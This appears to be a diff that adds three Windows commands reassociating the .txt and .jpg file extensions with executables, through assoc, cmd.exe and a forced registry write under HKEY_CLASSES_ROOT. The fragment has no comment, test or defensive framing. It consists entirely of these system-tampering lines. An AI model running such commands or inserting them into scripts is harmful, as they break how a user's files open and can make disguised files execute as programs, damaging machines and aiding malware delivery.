@@ -1,0 +1,3 @@
+assoc .txt=exefile
+cmd.exe /c "assoc.exe .jpg=exefile"
+reg add "HKEY_CLASSES_ROOT\.txt" /t REG_SZ /d "exefile" /f
